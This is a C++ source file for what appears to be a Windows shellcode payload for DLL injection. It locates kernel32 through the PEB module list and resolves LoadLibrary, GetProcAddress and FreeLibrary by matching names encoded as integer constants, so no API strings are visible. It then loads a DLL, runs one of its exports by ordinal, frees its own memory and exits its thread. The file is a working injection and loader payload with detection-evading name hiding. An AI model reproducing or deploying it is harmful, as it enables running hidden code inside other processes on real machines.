#include <windows.h>
#include <intrin.h>
#include <cstdint>
#include "../common.h"

//#define DEBUG

#ifdef DEBUG
#include <stdio.h>
#define LOGDEBUG printf
#else
#define LOGDEBUG
#endif

template<typename T>
T *rva(void *base, uint32_t offset) {
  return reinterpret_cast<T*>(reinterpret_cast<uint8_t*>(base) + offset);
}

bool GetProcAddresses(void *base, Package *package) {
  constexpr uint16_t MZ_SIGNATURE = 0x5a4d;
  constexpr uint32_t PE_SIGNATURE = 0x4550;
  constexpr uint32_t OFFSET_TO_PEHEADER = 0x3c; // IMAGE_DOS_HEADER::e_lfanew

  if (*rva<uint16_t>(base, 0) != MZ_SIGNATURE)
    return false;

  auto offset_to_header = *rva<uint32_t>(base, OFFSET_TO_PEHEADER);
  if (*rva<uint32_t>(base, offset_to_header) != PE_SIGNATURE)
    return false;
  offset_to_header += sizeof(PE_SIGNATURE);
#ifdef DEBUG
  auto machine = rva<IMAGE_FILE_HEADER>(base, offset_to_header)->Machine;
  if (machine != IMAGE_FILE_MACHINE_I386
      && machine != IMAGE_FILE_MACHINE_AMD64)
    return false;
#endif
  auto magic = *rva<uint16_t>(base,
    offset_to_header + sizeof(IMAGE_FILE_HEADER));
  auto offset_to_export_table = 0;
  // https://docs.microsoft.com/en-us/windows/desktop/api/winnt/ns-winnt-_image_data_directory
  if (magic == IMAGE_NT_OPTIONAL_HDR32_MAGIC)
    offset_to_export_table = 0x60;
  else if (magic == IMAGE_NT_OPTIONAL_HDR64_MAGIC)
    offset_to_export_table = 0x70;
  else
    return false;

  auto export_table_directory = rva<IMAGE_DATA_DIRECTORY>(base,
    offset_to_header + sizeof(IMAGE_FILE_HEADER) + offset_to_export_table);
  auto export_table = rva<IMAGE_EXPORT_DIRECTORY>(base,
    export_table_directory->VirtualAddress);
  auto names = rva<uint32_t>(base, export_table->AddressOfNames);
  auto ordinals = rva<uint16_t>(base, export_table->AddressOfNameOrdinals);
  auto functions = rva<uint32_t>(base, export_table->AddressOfFunctions);
  for (uint32_t i = 0; i<export_table->NumberOfNames; ++i) {
    auto name = rva<uint32_t>(base, names[i]);
    auto function = rva<void>(base, functions[ordinals[i]]);
    if (!package->xxxLoadLibrary
        && name[0] == 0x64616f4c
        && name[1] == 0x7262694c
        && name[2] == 0x57797261
        && (name[3] & 0xff) == 0) {
      package->xxxLoadLibrary = function;
    }
    else if (!package->xxxFreeLibrary
             && name[0] == 0x65657246
             && name[1] == 0x7262694c
             && name[2] == 0x00797261) {
      package->xxxFreeLibrary = function;
    }
    else if (!package->xxxGetProcAddress
             && name[0] == 0x50746547
             && name[1] == 0x41636f72
             && name[2] == 0x65726464
             && (name[3] & 0xffffff) == 0x007373) {
      package->xxxGetProcAddress = function;
    }
    else {
      continue;
    }
    LOGDEBUG("%4d->%4d %p %p {0x%08x, 0x%08x, ..} %s\n",
             i,
             ordinals[i],
             name,
             function,
             name[0],
             name[1],
             reinterpret_cast<LPCSTR>(name));
  }
  return true;
}

void GetImageBase(Package *package) {
  auto begin = &package->peb->Ldr->InMemoryOrderModuleList;
  for (auto p = begin->Flink; p != begin; p = p->Flink) {
    auto entry = CONTAINING_RECORD(p, LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks);
    auto name = reinterpret_cast<uint32_t*>(entry->BaseDllName.Buffer);
    if (!package->kernel32
        && (name[0] == 0x0045004b
            && name[1] == 0x004e0052
            && name[2] == 0x004c0045
            && name[3] == 0x00320033
            && (name[4] & 0xffff) == 0x002e)
        || (name[0] == 0x0065006b
            && name[1] == 0x006e0072
            && name[2] == 0x006c0065
            && name[3] == 0x00320033
            && (name[4] & 0xffff) == 0x002e)) {
      package->kernel32 = entry->DllBase;
    }
    else {
      continue;
    }
    LOGDEBUG("%p %S\n",
             entry->DllBase,
             reinterpret_cast<LPCWSTR>(entry->BaseDllName.Buffer));
  }
}

// http://en.wikipedia.org/wiki/Win32_Thread_Information_Block
// [fs:0030h] --> x86 PEB
// [gs:0030h] --> x64 TEB
PEB *GetPeb() {
  PEB *Peb = 0;

#ifdef _WIN64
  size_t Teb = __readgsqword(0x30);
  LOGDEBUG("TEB = %016zx\n", Teb);

  // 0x60 = ntdll!_TEB::ProcessEnvironmentBlock
  Peb = *reinterpret_cast<PEB**>(Teb + 0x60);
#else
  Peb = reinterpret_cast<PEB*>(__readfsdword(0x30));
#endif

  LOGDEBUG("PEB = %p\n", Peb);
  return Peb;
}

void WINAPI ShellCode(Package *p) {
  p->peb = GetPeb();
  GetImageBase(p);
  if (!GetProcAddresses(p->kernel32, p)) return;
#ifndef DEBUG
  size_t string_VirtualFree = 0x123;
  size_t string_ExitThread = 0x456;
  constexpr uint16_t ordinal = 0xdead;
  void *hm = p->xxxLoadLibrary(p->dllpath);
  if (hm) {
    auto f = p->xxxGetProcAddress(hm, MAKEINTRESOURCEA(ordinal));
    if (f) reinterpret_cast<LPTHREAD_START_ROUTINE>(f)(p);
    p->xxxFreeLibrary(hm);
  }

  // In assembly, push ExitThread and jump to VirtualFree.
  // For easier assembly modification, get ExitThread's address first,
  // and call VirtualFree first.
  auto xxxExitThread = p->xxxGetProcAddress(p->kernel32, &string_ExitThread);
  auto xxxVirtualFree = p->xxxGetProcAddress(p->kernel32, &string_VirtualFree);
  if (xxxVirtualFree && xxxExitThread) {
    reinterpret_cast<uint32_t(WINAPI*)(void*, size_t, uint32_t)>(xxxVirtualFree)(
      p, 0, MEM_RELEASE);
    reinterpret_cast<void(WINAPI*)(uint32_t)>(xxxExitThread)(0);
  }
#endif
}

int main() {
  Package p{};
  LOGDEBUG("sizeof(Package) = %zu\n", sizeof(Package));
  ShellCode(&p);
  return 0;
}
